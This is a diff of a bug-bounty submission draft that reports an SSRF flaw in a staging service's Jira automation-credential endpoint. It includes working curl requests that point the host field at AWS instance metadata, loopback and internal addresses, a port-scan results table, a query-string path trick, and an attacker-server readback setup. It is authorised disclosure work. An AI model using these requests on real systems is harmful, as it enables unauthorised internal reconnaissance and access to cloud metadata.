@@ -1,49 +1,59 @@
-# BUG-012 Submission Draft — Full-read SSRF via attacker-controlled Jira credential `host`
+# BUG-012 Submission Draft — SSRF via unvalidated `data.host` in automation credentials (internal port/service scan)
 
-**Title:** Full-read SSRF (CWE-918) via unvalidated `data.host` in automation credential creation — authenticated user can make internal integration service fetch arbitrary URLs and read responses back
-**Severity:** P2 (SSRF with full readback; internal reachability oracle; IMDSv2 currently blocks credential theft)
+**Title:** SSRF (CWE-918): unvalidated `data.host` in jira automation credential creation lets an authenticated user make the internal integration service fetch arbitrary URLs — internal port/service scan demonstrated (AWS IMDS + integration service identified), full-read readback against external hosts
+**Severity:** P3 — VRT: Server Security Misconfiguration / Server-Side Request Forgery (SSRF) / **Internal Port Service Scan**
 **Target:** https://bugbounty1.qe.optrostaging.ai
 
 ## Steps to reproduce
 
-1. **Create the credential** (any authenticated user; attacker host is accepted verbatim):
+1. **Create the credential** (any authenticated user; the internal host is accepted verbatim — no scheme/host/IP validation):
 
 ```
 curl -sS "https://bugbounty1.qe.optrostaging.ai/api/v1/automation_credentials" \
   -H "token: <id>:<secret>" -H "X-Optro-Bug-Bounty: zeno0" -H "X-Auditboard-Product: System" \
   -H "Content-Type: application/json" \
-  -d '{"automation_credential":{"name":"zx-ssrf-probe","handler_type":"jira","type":"jira","data":{"host":"https://<attacker-server>/t049e-cred-host","type":"jira","email":"attacker@example.com","apiToken":"ZxProbeToken123"}}}'
+  -d '{"automation_credential":{"name":"zx-ssrf-probe","handler_type":"jira","type":"jira","data":{"host":"http://169.254.169.254/latest/meta-data/","type":"jira","email":"attacker@example.com","apiToken":"ZxProbeToken123"}}}'
 ```
 
 → 200, note `id`.
 
-2. **Make the attacker server answer** any request with:
-
-```
-{"isLast":true,"values":[{"id":"10001","key":"ZXSSRF","name":"ZX SSRF Readback Project","avatarUrls":{},"self":"https://zx.example/jira"}],"self":"https://zx.example","total":1,"maxResults":50,"startAt":0}
-```
-
-3. **Trigger + read back:**
+2. **Trigger the server-side fetch and read the relayed status:**
 
 ```
 curl -sS "https://bugbounty1.qe.optrostaging.ai/api/v1/ticketing/projects?credentialId=<id>" \
   -H "token: <id>:<secret>" -H "X-Optro-Bug-Bounty: zeno0" -H "X-Auditboard-Product: System"
 ```
 
-→ 200 `{"projects":[{"id":"10001","name":"ZX SSRF Readback Project","description":"ZXSSRF"}]}` — attacker-supplied values returned as application data.
+→ `401 {"errors":[{"code":"ApiError","detail":"Unauthorized",...}]}` in ~0.5 s — **the integration service fetched AWS link-local metadata (169.254.169.254) and relayed its status code.** IMDSv2 rejects the tokenless GET, so no credentials return — but the metadata service itself is identified.
 
-4. **Internal oracle** — repeat step 1 with `host` = `http://169.254.169.254/latest/meta-data/`, then step 3 → distinct **401 ApiError in ~0.5 s** (IMDS reached; vs 500 generic for refused `127.0.0.1:9002`, vs indefinite hang for blackholed `172.31.0.1`). Verification status is persisted and readable: `GET /api/v1/automation_credentials/<id>` → `last_verified: {"results":[{"status":200}], ...}`.
+3. **Repeat as a scanner** — update the same credential (`PUT /api/v1/automation_credentials/<id>`, also triggers a verify) with each `data.host`, then repeat step 2:
 
-## Evidence summary
+| `data.host` | Result |
+| --- | --- |
+| `http://127.0.0.1:3000/` | `404 ApiError "Not Found"` — **internal loopback HTTP service OPEN** |
+| `http://127.0.0.1:6379/` (also 8080/9000/9001/9002) | generic `500` ~0.5 s — **closed/refused** |
+| `http://integrations.qa.soxhubapp.com/` | `404 ApiError` — **AuditBoard integration service identified** (:80 and :443) |
+| `http://10.255.255.1/`, `http://172.31.0.1/` | request hangs — **filtered/blackholed** |
+| `https://kubernetes.default.svc/version`, `http://metadata.google.internal/...` | generic `500` — no cluster/GCP metadata (EC2-style topology) |
 
-- Server-side requests hit attacker server: `GET <host>/rest/api/3/project/search?startAt=0&maxResults=50` (UA `axios/1.20.0`) and `POST <host>/rest/webhooks/1.0/webhook` (UA `node`) with body leaking internal host `https://integrations.qa.soxhubapp.com/api/v1/jira/credential/<id>/issues/{issue.key}?instanceUrl=https://bugbounty1.qe.optrostaging.ai`.
-- No scheme/host/IP validation on `data.host` (link-local, loopback, RFC1918 all accepted).
-- Full content readback through the Jira parser; error-code + timing oracle for internal targets; persisted status-code oracle via `last_verified`.
+Remote 4xx statuses pass through as distinct `ApiError` classes (`Unauthorized` / `Forbidden` / `Not Found` / `Too Many Requests`) → repeatable open/closed/filtered differentiation with service identification.
+
+4. **Arbitrary-path GET on internal services** — the backend builds requests by string concatenation, so a `?` in the host pushes the fixed Jira suffix into the query string:
+
+```
+data.host = "http://localhost:3000/api/v1/users/me?zx="
+→ server fetches GET http://localhost:3000/api/v1/users/me?zx=/rest/api/3/project/search?startAt=0&maxResults=50
+→ distinct per-path status classes returned (proven: 404 for /, /api/v1/users/me, /up, jira callback route)
+```
+
+5. **External full-read (base capability, VRT external):** point `data.host` at an attacker server answering any GET with `{"isLast":true,"values":[{"id":"10001","key":"ZXSSRF","name":"ZX SSRF Readback Project","avatarUrls":{},"self":"https://zx.example/jira"}],...}` → step 2 returns `200 {"projects":[{"id":"10001","name":"ZX SSRF Readback Project","description":"ZXSSRF"}]}`. Server-side: `GET <host>/rest/api/3/project/search?startAt=0&maxResults=50` (UA `axios/1.20.0`) + `POST <host>/rest/webhooks/1.0/webhook` (UA `node`).
 
 ## Impact
 
-Authenticated attacker can pivot an internal Node integration service into a request proxy: full-read SSRF to attacker-controlled hosts, internal service/port discovery from inside the VPC, POST-based SSRF, internal topology disclosure. IMDSv2 blocks instance-credential theft today; app/data-tier RFC1918 targets were blackholed in testing (honest ceiling), but the metadata hop and readback primitive remain P2-grade.
+- **Internal port/service scan from an authenticated session:** open/closed/filtered differentiation across internal loopback and RFC1918 targets, with two internal services **identified by name** — the AWS instance metadata service (169.254.169.254) and the AuditBoard integration service itself — plus arbitrary-path GET reachability on internal HTTP services and POST capability via webhook registration.
+- **Topology disclosure:** IMDS reachable, no k8s/GCP/ECS metadata fingerprints, blackhole differentials between app-tier segments → EC2-instance-style deployment map.
+- **Honest ceiling:** IMDSv2 enforced (no instance credentials); internal response content is never reflected (Jira-shape parser gate; failures persist only generic text) → no internal data/secret exposure demonstrated. External full-read readback works against attacker hosts.
 
 ## Notes
 
-- No delete route exists for credentials (DELETE → 404); tester artifacts ids 61–64 (`t049e-zx-probe`, `t049f-*`) remain in the org and should be removed by the vendor.
+- No delete route for credentials (DELETE → 404); test artifacts ids 61–76 (`t049e`/`t049f`/`t050a-zx-oracle`) remain in the org and should be removed by the vendor (~40 similar artifacts from other testers already exist).
